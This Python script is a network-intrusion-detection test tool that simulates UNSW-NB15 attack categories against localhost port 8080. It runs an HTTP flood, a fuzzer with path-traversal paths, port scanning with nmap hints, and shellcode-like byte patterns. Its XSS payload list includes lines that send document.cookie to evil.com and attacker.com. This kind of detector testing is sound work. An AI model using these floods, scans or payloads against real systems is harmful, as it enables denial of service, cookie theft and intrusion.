#!/usr/bin/env python3
"""
NIDS Attack Simulator — UNSW-NB15 Attack Categories
====================================================
Simulates all attack types the model was trained on:
  1. DoS          (current baseline)
  2. Fuzzer       — random HTTP paths/params/methods
  3. Port Scan    — SYN flood to port 8080 (agent watches 8080)
  4. HTTP Methods Enumeration
  5. XSS          — GET/POST with XSS payloads
  6. Shellcode    — binary payloads embedded in POST body
  7. Worm         — rapid multi-threaded connections

Usage:
  python attack_simulator.py --attack dos        --threads 200 --duration 30
  python attack_simulator.py --attack fuzzer      --threads 50  --duration 30
  python attack_simulator.py --attack portscan   --threads 100 --duration 20
  python attack_simulator.py --attack httpenum   --threads 50  --duration 30
  python attack_simulator.py --attack xss        --threads 50  --duration 30
  python attack_simulator.py --attack shellcode  --threads 30  --duration 30
  python attack_simulator.py --attack worm       --threads 80  --duration 30
  python attack_simulator.py --attack all        --threads 50  --duration 10
"""

import argparse
import random
import socket
import string
import struct
import threading
import time
import requests
from urllib.parse import urlencode

# ── CONFIG ──────────────────────────────────────────────────────────────────
TARGET_HOST = "127.0.0.1"
TARGET_PORT = 8080
BASE_URL    = f"http://{TARGET_HOST}:{TARGET_PORT}"

stop_event  = threading.Event()

# ── SHARED COUNTER ───────────────────────────────────────────────────────────
_lock    = threading.Lock()
counters = {"sent": 0, "errors": 0}

def inc(key):
    with _lock:
        counters[key] += 1

def print_stats(attack_name: str):
    with _lock:
        print(f"  [{attack_name}] sent={counters['sent']}  errors={counters['errors']}")


# ╔══════════════════════════════════════════════════════════════════════════╗
# ║  1. DoS — HTTP flood to /api/v1/google/auth                             ║
# ╚══════════════════════════════════════════════════════════════════════════╝
def dos_worker():
    sess = requests.Session()
    while not stop_event.is_set():
        try:
            sess.get(f"{BASE_URL}/api/v1/google/auth", timeout=2)
            inc("sent")
        except Exception:
            inc("errors")


# ╔══════════════════════════════════════════════════════════════════════════╗
# ║  2. Fuzzer — random paths, params, methods, headers                      ║
# ║                                                                          ║
# ║  UNSW-NB15 "Fuzzers" category: anomalous ct_flw_http_mthd, random       ║
# ║  sbytes/smean, high rate, mixed state (FIN + RST).                       ║
# ║  The agent's count_http_methods() will see diverse method bytes and      ║
# ║  ct_srv_dst will spike → model flags ATTACK.                             ║
# ╚══════════════════════════════════════════════════════════════════════════╝

_FUZZ_METHODS = ["GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS",
                 "TRACE", "CONNECT", "FUZZ", "INVALID"]

_FUZZ_PATHS = [
    "/api/v1/google/auth", "/api/v1/user", "/api/v1/data",
    "/../../../etc/passwd", "/admin", "/config", "/%00",
    "/api/v1/google/auth?id=<>", "/api/" + "A"*512,
    "/api/v1/google/auth?" + "x=" + "A"*1000,
    "/.git/config", "/wp-admin", "/phpmyadmin",
]

def fuzzer_worker():
    while not stop_event.is_set():
        method = random.choice(_FUZZ_METHODS)
        path   = random.choice(_FUZZ_PATHS)
        url    = f"{BASE_URL}{path}"
        # random query string
        params = {
            "".join(random.choices(string.ascii_letters, k=5)):
            "".join(random.choices(string.printable, k=random.randint(5, 200)))
            for _ in range(random.randint(0, 4))
        }
        # random body for POST/PUT
        body = "".join(random.choices(string.printable, k=random.randint(0, 500)))
        try:
            requests.request(
                method, url, params=params, data=body,
                headers={
                    "User-Agent": "".join(random.choices(string.ascii_letters, k=20)),
                    "X-Fuzz-Id": str(random.randint(1, 99999)),
                },
                timeout=2
            )
            inc("sent")
        except Exception:
            inc("errors")


# ╔══════════════════════════════════════════════════════════════════════════╗
# ║  3. Port Scan — raw SYN packets to port 8080                             ║
# ║                                                                          ║
# ║  NOTE: The agent sniffs port 8080 only. Real nmap scans hit ALL ports    ║
# ║  so most packets are invisible to the agent. This test focuses SYN       ║
# ║  half-opens at TARGET_PORT so the agent sees them as RST/INT flows →     ║
# ║  ct_state_ttl + ct_srv_dst spike → ATTACK.                               ║
# ║                                                                          ║
# ║  For full port-scan simulation: see portscan_nmap() below.               ║
# ╚══════════════════════════════════════════════════════════════════════════╝

def portscan_worker():
    """
    Simulate a port-scanner probing port 8080:
    Open a raw TCP socket, send SYN, never complete the handshake.
    The server sends SYN-ACK (or RST). The agent sees a half-open RST flow.
    Falls back to connect() if raw socket not available (no root).
    """
    while not stop_event.is_set():
        try:
            # Attempt a SYN-only connect (OS will complete handshake, but
            # connection immediately closed = RST-like short flow for the agent)
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.3)
            try:
                s.connect((TARGET_HOST, TARGET_PORT))
            except (socket.timeout, ConnectionRefusedError):
                pass
            finally:
                s.close()
            inc("sent")
        except Exception:
            inc("errors")
        # Port scanners move fast; tiny sleep so we don't starve the OS
        time.sleep(0.005)


def portscan_nmap_hint():
    """
    Print the nmap command to run a real port scan captured by the agent.
    (Run in a separate terminal — requires nmap installed.)
    """
    print("\n[PortScan] Alternatively run nmap against port 8080 specifically:")
    print(f"  nmap -sS -p 8080 --max-rate 500 {TARGET_HOST}")
    print(f"  nmap -sT -p 8080 --max-rate 200 {TARGET_HOST}")
    print("  (sS = SYN scan, requires root/admin)")


# ╔══════════════════════════════════════════════════════════════════════════╗
# ║  4. HTTP Methods Enumeration                                              ║
# ║                                                                          ║
# ║  Hammers every HTTP method against the auth endpoint.                    ║
# ║  agent.count_http_methods() counts GET/POST/PUT/DELETE/HEAD prefixes.    ║
# ║  ct_flw_http_mthd will be high → anomalous for a single flow → ATTACK.  ║
# ╚══════════════════════════════════════════════════════════════════════════╝

_ALL_METHODS = ["GET", "POST", "PUT", "DELETE", "HEAD", "OPTIONS", "PATCH", "TRACE"]

def httpenum_worker():
    sess = requests.Session()
    while not stop_event.is_set():
        for method in _ALL_METHODS:
            if stop_event.is_set():
                break
            try:
                sess.request(
                    method,
                    f"{BASE_URL}/api/v1/google/auth",
                    timeout=2,
                    allow_redirects=False,
                )
                inc("sent")
            except Exception:
                inc("errors")


# ╔══════════════════════════════════════════════════════════════════════════╗
# ║  5. XSS — Cross-Site Scripting payloads in query/body                    ║
# ║                                                                          ║
# ║  XSS in UNSW-NB15 is classified by anomalous sbytes/smean and           ║
# ║  unusual response_body_len. The agent measures payload bytes via         ║
# ║  get_payload_bytes(). Repeated XSS probes spike ct_srv_dst + rate.      ║
# ╚══════════════════════════════════════════════════════════════════════════╝

_XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    '"><script>alert(document.cookie)</script>',
    "<img src=x onerror=alert(1)>",
    "javascript:alert(1)",
    "<svg onload=alert(1)>",
    '"><img src=x onerror="fetch(\'http://evil.com/steal?c=\'+document.cookie)">',
    "<body onload=alert('XSS')>",
    "';alert(String.fromCharCode(88,83,83))//",
    '"+alert(1)+"',
    "<script>document.location='http://attacker.com/?c='+document.cookie</script>",
    "<iframe src='javascript:alert(1)'></iframe>",
    "<<SCRIPT>alert('XSS');//<</SCRIPT>",
    "%3Cscript%3Ealert(1)%3C/script%3E",      # URL-encoded
    "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",  # HTML entity
]

def xss_worker():
    sess = requests.Session()
    while not stop_event.is_set():
        payload = random.choice(_XSS_PAYLOADS)
        try:
            # GET with XSS in query params
            sess.get(
                f"{BASE_URL}/api/v1/google/auth",
                params={
                    "redirect": payload,
                    "username": payload,
                    "token": "valid_token_" + payload,
                },
                timeout=2,
            )
            inc("sent")
            # POST with XSS in body (JSON + form)
            sess.post(
                f"{BASE_URL}/api/v1/google/auth",
                json={"username": payload, "comment": payload * 3},
                timeout=2,
            )
            inc("sent")
        except Exception:
            inc("errors")


# ╔══════════════════════════════════════════════════════════════════════════╗
# ║  6. Shellcode Attack — binary payloads in HTTP POST                      ║
# ║                                                                          ║
# ║  Shellcode in UNSW-NB15 is characterized by:                            ║
# ║    • Large sbytes (big payload), small dpkts/dbytes (no response)       ║
# ║    • High smean (big packets), low dmean                                ║
# ║    • get_payload_bytes() will be high                                   ║
# ║  The model's autoencoder sees anomalous reconstruction error → ATTACK.  ║
# ╚══════════════════════════════════════════════════════════════════════════╝

# Classic shellcode byte patterns (safe to transmit, no real executable intent)
_SHELLCODE_PREFIXES = [
    b"\x31\xc0\x50\x68",           # Linux x86 execve prologue
    b"\x90\x90\x90\x90",           # NOP sled
    b"\xeb\x0c\x5e\x56",           # JMP-CALL-POP
    b"\xfc\xe8\x82\x00",           # Windows shellcode header
    b"\x6a\x46\x58\x31\xdb\xcd",   # setuid + int 0x80
]

def _gen_shellcode_payload(size: int = 1024) -> bytes:
    prefix = random.choice(_SHELLCODE_PREFIXES)
    nop_sled = b"\x90" * random.randint(50, 200)
    junk = bytes(random.randint(0, 255) for _ in range(size))
    return prefix + nop_sled + junk

def shellcode_worker():
    while not stop_event.is_set():
        payload = _gen_shellcode_payload(random.randint(512, 4096))
        try:
            requests.post(
                f"{BASE_URL}/api/v1/google/auth",
                data=payload,
                headers={
                    "Content-Type": "application/octet-stream",
                    "X-Exploit-Attempt": "1",
                },
                timeout=3,
            )
            inc("sent")
        except Exception:
            inc("errors")
        time.sleep(0.02)   # Shellcode attacks are slower, bigger payloads


# ╔══════════════════════════════════════════════════════════════════════════╗
# ║  7. Worm — self-propagating style: many sources, many destinations       ║
# ║                                                                          ║
# ║  Worm behavior in UNSW-NB15: many unique source IPs connecting to the   ║
# ║  same destination rapidly. ct_dst_ltm and ct_srv_dst spike fast.        ║
# ║  We simulate by spawning threads that each open many rapid connections.  ║
# ╚══════════════════════════════════════════════════════════════════════════╝

def worm_worker():
    """
    Each worm thread rapidly opens/closes raw TCP connections without
    sending an application payload — like a worm scanning for open services.
    """
    while not stop_event.is_set():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5)
            s.connect((TARGET_HOST, TARGET_PORT))
            # Worm sends a tiny probe, then immediately closes
            s.sendall(b"HEAD / HTTP/1.0\r\n\r\n")
            try: s.recv(64)
            except: pass
            s.close()
            inc("sent")
        except Exception:
            inc("errors")
        # Very short inter-connection time = worm-like behaviour
        time.sleep(random.uniform(0.001, 0.01))


# ╔══════════════════════════════════════════════════════════════════════════╗
# ║  RUNNER                                                                  ║
# ╚══════════════════════════════════════════════════════════════════════════╝

_ATTACK_MAP = {
    "dos":       (dos_worker,       "DoS — HTTP flood"),
    "fuzzer":    (fuzzer_worker,    "Fuzzer — random HTTP chaos"),
    "portscan":  (portscan_worker,  "Port Scan — SYN half-open to 8080"),
    "httpenum":  (httpenum_worker,  "HTTP Methods Enumeration"),
    "xss":       (xss_worker,       "XSS — Cross-Site Scripting payloads"),
    "shellcode": (shellcode_worker, "Shellcode — binary payload injection"),
    "worm":      (worm_worker,      "Worm — rapid multi-connection spread"),
}

def run_attack(name: str, worker_fn, n_threads: int, duration: int):
    print(f"\n{'='*60}")
    print(f"  ATTACK: {name}")
    print(f"  Threads: {n_threads}  |  Duration: {duration}s")
    print(f"  Target:  {BASE_URL}")
    print(f"{'='*60}")

    counters["sent"]   = 0
    counters["errors"] = 0
    stop_event.clear()

    threads = [threading.Thread(target=worker_fn, daemon=True)
               for _ in range(n_threads)]
    for t in threads:
        t.start()

    start = time.time()
    while time.time() - start < duration:
        elapsed = int(time.time() - start)
        print_stats(f"{name} | {elapsed}s/{duration}s")
        time.sleep(5)

    stop_event.set()
    for t in threads:
        t.join(timeout=3)

    print(f"\n[DONE] {name}")
    print_stats(name)


def main():
    parser = argparse.ArgumentParser(
        description="NIDS Attack Simulator for UNSW-NB15 attack categories"
    )
    parser.add_argument(
        "--attack",
        choices=list(_ATTACK_MAP.keys()) + ["all"],
        required=True,
        help="Attack type to simulate"
    )
    parser.add_argument("--threads",  type=int, default=50,  help="Number of worker threads")
    parser.add_argument("--duration", type=int, default=30,  help="Duration per attack in seconds")
    args = parser.parse_args()

    # Hint for port scan
    if args.attack in ("portscan", "all"):
        portscan_nmap_hint()

    if args.attack == "all":
        for key, (fn, label) in _ATTACK_MAP.items():
            run_attack(label, fn, args.threads, args.duration)
    else:
        fn, label = _ATTACK_MAP[args.attack]
        run_attack(label, fn, args.threads, args.duration)


if __name__ == "__main__":
    main()